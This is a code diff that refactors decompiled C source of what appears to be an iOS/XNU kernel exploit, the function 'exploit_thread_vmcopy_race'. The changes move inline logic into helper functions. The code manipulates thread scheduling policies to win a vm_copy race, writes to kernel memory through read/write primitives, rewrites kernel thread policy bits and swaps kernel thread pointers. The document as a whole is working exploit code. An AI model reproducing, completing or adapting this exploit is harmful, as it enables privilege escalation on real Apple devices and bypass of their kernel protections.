@@ -176,7 +176,17 @@ enum
   VMCOPY_FAKE_CONTINUATION_OFFSET = 552,
   VMCOPY_MESSAGE_KADDR_OFFSET = 664,
   VMCOPY_CAPTURED_THREAD_OFFSET = 672,
+  VMCOPY_MAPPED_THREAD_POLICY_OFFSET = 272,
+  VMCOPY_MAPPED_THREAD_NEXT_OFFSET = 296,
   VMCOPY_THREAD_SPRAY_COUNT = 256,
+  VMCOPY_THREAD_POLICY_CONSTRAINT_FLAVOR = 2,
+  VMCOPY_THREAD_POLICY_CONSTRAINT_WORDS = 4,
+  VMCOPY_THREAD_POLICY_MARK_TEST_BIT = 0x1000,
+  VMCOPY_THREAD_POLICY_BASE_DEFAULT = 0x400204,
+  VMCOPY_THREAD_POLICY_BASE_MARKED = 0x400208,
+  VMCOPY_THREAD_POLICY_EXTRA_BITS = 0x3C0,
+  VMCOPY_THREAD_POLICY_FLUSH_WIDE = 0x7FFFFFFF,
+  VMCOPY_THREAD_POLICY_FLUSH_NARROW = 0x100,
   VMCOPY_POLICY_MARK_XNU_MIN = 8796,
   VMCOPY_POLICY_MARK_DEFAULT_OFFSET = 184,
   VMCOPY_POLICY_MARK_LEGACY_CPU_OFFSET = 112,
@@ -350,6 +360,95 @@ static inline void vmcopy_spray_threads_and_clear_prev_link(
       *lastThread = 0;
     }
   }
+}
+
+static inline uint64_t vmcopy_set_low_priority_and_find_policy_offset(
+        __int64 kreadCtx,
+        pthread_t raceThread,
+        integer_t policyInfo[VMCOPY_THREAD_POLICY_CONSTRAINT_WORDS],
+        unsigned int *policyOffset)
+{
+  thread_act_t raceMachThread = pthread_mach_thread_np(raceThread);
+  policyInfo[0] = kVmcopyRaceLowPriorityPolicy[0];
+  policyInfo[1] = kVmcopyRaceLowPriorityPolicy[1];
+  policyInfo[2] = kVmcopyRaceLowPriorityPolicy[2];
+  policyInfo[3] = kVmcopyRaceLowPriorityPolicy[3];
+  thread_policy_set(
+    raceMachThread,
+    VMCOPY_THREAD_POLICY_CONSTRAINT_FLAVOR,
+    policyInfo,
+    VMCOPY_THREAD_POLICY_CONSTRAINT_WORDS);
+
+  uint64_t raceThreadKaddr = get_task_kobject_addr_from_field32(kreadCtx, raceMachThread);
+  if ( !*policyOffset )
+    *policyOffset = vmcopy_find_thread_policy_offset(kreadCtx, raceThreadKaddr, policyInfo);
+
+  return raceThreadKaddr;
+}
+
+static inline void vmcopy_prepare_current_thread_policy_race(
+        __int64 kreadCtx,
+        uint32_t policyOffset,
+        integer_t policyInfo[VMCOPY_THREAD_POLICY_CONSTRAINT_WORDS])
+{
+  policyInfo[0] = kVmcopyRaceHighPriorityPolicy[0];
+  policyInfo[1] = kVmcopyRaceHighPriorityPolicy[1];
+  policyInfo[2] = kVmcopyRaceHighPriorityPolicy[2];
+  policyInfo[3] = kVmcopyRaceHighPriorityPolicy[3];
+  thread_policy_set(
+    mach_thread_self(),
+    VMCOPY_THREAD_POLICY_CONSTRAINT_FLAVOR,
+    policyInfo,
+    VMCOPY_THREAD_POLICY_CONSTRAINT_WORDS);
+
+  uint64_t policyKaddr = get_task_kobject_addr_from_field32(kreadCtx, mach_thread_self()) + policyOffset;
+  flush_cpu_cache(kreadCtx, policyKaddr, VMCOPY_THREAD_POLICY_FLUSH_WIDE);
+  flush_cpu_cache(kreadCtx, policyKaddr + 4, VMCOPY_THREAD_POLICY_FLUSH_WIDE);
+  flush_cpu_cache(kreadCtx, policyKaddr + 8, VMCOPY_THREAD_POLICY_FLUSH_WIDE);
+  flush_cpu_cache(kreadCtx, policyKaddr + 12, VMCOPY_THREAD_POLICY_FLUSH_NARROW);
+  kwrite_u64_to_addr(kreadCtx, policyKaddr + 16, 0xFFFFFFFFFFFFFFFLL);
+}
+
+static inline uint64_t vmcopy_apply_thread_policy_bits(__int64 state, vm_address_t mappedThreadObject)
+{
+  uint64_t originalNext = *(uint64_t *)(mappedThreadObject + VMCOPY_MAPPED_THREAD_NEXT_OFFSET);
+  uint32_t policyBase = VMCOPY_THREAD_POLICY_BASE_DEFAULT;
+
+  if ( (*(uint32_t *)(mappedThreadObject + VMCOPY_MAPPED_THREAD_POLICY_OFFSET) & VMCOPY_THREAD_POLICY_MARK_TEST_BIT) != 0 )
+    policyBase = VMCOPY_THREAD_POLICY_BASE_MARKED;
+
+  *(uint32_t *)(state + 660) = policyBase;
+  uint32_t policyBits = policyBase | VMCOPY_THREAD_POLICY_EXTRA_BITS;
+  *(uint32_t *)(state + VMCOPY_THREAD_POLICY_BITS_OFFSET) = policyBits;
+  *(uint32_t *)(mappedThreadObject + VMCOPY_MAPPED_THREAD_POLICY_OFFSET) = policyBits;
+
+  return originalNext;
+}
+
+static inline uint64_t vmcopy_wait_for_thread_slot_replacement(
+        __int64 kreadCtx,
+        __int64 *targetThreadSlot,
+        uint64_t originalThreadKaddr,
+        __int64 *raceState)
+{
+  thread_switch(0, 0, 0);
+  *raceState = 1;
+
+  while ( *raceState == 1 )
+  {
+    uint64_t replacementThreadKaddr = *targetThreadSlot;
+    if ( !replacementThreadKaddr )
+      continue;
+
+    uint64_t previousThreadKaddr = *(targetThreadSlot - 1);
+    if ( maybe_sptm_translate_kaddr(KRWCTX_FROM_RAW_FIELD(kreadCtx, 32), replacementThreadKaddr) == previousThreadKaddr )
+    {
+      *targetThreadSlot = originalThreadKaddr;
+      return previousThreadKaddr;
+    }
+  }
+
+  return 0;
 }
 
 static inline void vmcopy_mark_thread_policy_word_if_needed(
@@ -8153,17 +8252,10 @@ __int64 __fastcall exploit_thread_vmcopy_race(__int64 someStruct)
   unsigned __int64 v25; // x0
   vm_offset_t v26; // x26
   vm_address_t v27; // x26
-  thread_act_t v28; // w22
   unsigned __int64 v29; // x22
   __int64 *v35; // x24
   vm_address_t v36; // x28
-  thread_act_t v37; // w0
-  __int64 v38; // x22
-  mach_port_t v39; // w0
-  mach_vm_address_t v40; // x22
   __int64 v41; // x26
-  int v42; // w8
-  int v43; // w8
   __int64 v44; // x22
   __int64 v47; // x8
   __int64 v48; // x28
@@ -8328,61 +8420,17 @@ __int64 __fastcall exploit_thread_vmcopy_race(__int64 someStruct)
     vmcopy_init_race_thread_block(&raceThreadBlock, &v150, &target_act, v180, v160, semaphore);
     pthread_create(&v149, 0, (void *(__cdecl *)(void *))call_vtable_ptr_slot2, &raceThreadBlock);
     semaphore_wait(semaphore);
-    v28 = pthread_mach_thread_np(v149);
-    policy_info[0] = kVmcopyRaceLowPriorityPolicy[0];
-    policy_info[1] = kVmcopyRaceLowPriorityPolicy[1];
-    policy_info[2] = kVmcopyRaceLowPriorityPolicy[2];
-    policy_info[3] = kVmcopyRaceLowPriorityPolicy[3];
-    thread_policy_set(v28, 2u, policy_info, 4u);
-    v29 = get_task_kobject_addr_from_field32(*(uint64_t *)(someStruct + 8), v28);
-    if ( !v107 )
-      v107 = vmcopy_find_thread_policy_offset(*v2, v29, policy_info);
+    v29 = vmcopy_set_low_priority_and_find_policy_offset(*v2, v149, policy_info, &v107);
     v35 = (__int64 *)(v98 + (v23 & 0x3FFF) + v97);
     v36 = v27 + v105;
     flush_cpu_cache(*(uint64_t *)(someStruct + 8), v29 + v107 + 4, 1);
-    policy_info[0] = kVmcopyRaceHighPriorityPolicy[0];
-    policy_info[1] = kVmcopyRaceHighPriorityPolicy[1];
-    policy_info[2] = kVmcopyRaceHighPriorityPolicy[2];
-    policy_info[3] = kVmcopyRaceHighPriorityPolicy[3];
-    v37 = mach_thread_self();
-    thread_policy_set(v37, 2u, policy_info, 4u);
-    v38 = *(uint64_t *)(someStruct + 8);
-    v39 = mach_thread_self();
-    v40 = get_task_kobject_addr_from_field32(v38, v39) + v107;
-    flush_cpu_cache(*(uint64_t *)(someStruct + 8), v40, 0x7FFFFFFF);
-    flush_cpu_cache(*(uint64_t *)(someStruct + 8), v40 + 4, 0x7FFFFFFF);
-    flush_cpu_cache(*(uint64_t *)(someStruct + 8), v40 + 8, 0x7FFFFFFF);
-    flush_cpu_cache(*(uint64_t *)(someStruct + 8), v40 + 12, 256);
-    kwrite_u64_to_addr(*(uint64_t *)(someStruct + 8), v40 + 16, 0xFFFFFFFFFFFFFFFLL);
+    vmcopy_prepare_current_thread_policy_race(*v2, v107, policy_info);
     semaphore_signal(v160);
     *(v35 - 1) = 0;
-    v41 = *(uint64_t *)(v27 + v105 + 296);
-    if ( (*(uint32_t *)(v36 + 272) & 0x1000) != 0 )
-      v42 = 4194824;
-    else
-      v42 = 4194820;
-    *(uint32_t *)(someStruct + 660) = v42;
-    v43 = v42 | 0x3C0;
-    *(uint32_t *)(someStruct + 656) = v43;
-    *(uint32_t *)(v36 + 272) = v43;
+    v41 = vmcopy_apply_thread_policy_bits(someStruct, v36);
     if ( v104 <= 10001 )
       *v35 = 0;
-    thread_switch(0, 0, 0);
-    v150 = 1;
-    while ( v150 == 1 )
-    {
-      if ( *v35 )
-      {
-        v44 = *(v35 - 1);
-        if ( maybe_sptm_translate_kaddr(KRWCTX_FROM_RAW_FIELD(*v2, 32), *v35) == v44 )
-        {
-          *v35 = v96;
-          goto LABEL_47;
-        }
-      }
-    }
-    v44 = 0;
-LABEL_47:
+    v44 = vmcopy_wait_for_thread_slot_replacement(*v2, v35, v96, &v150);
     pthread_join(v149, 0);
     if ( v104 <= 10001 )
       *v35 = v44;
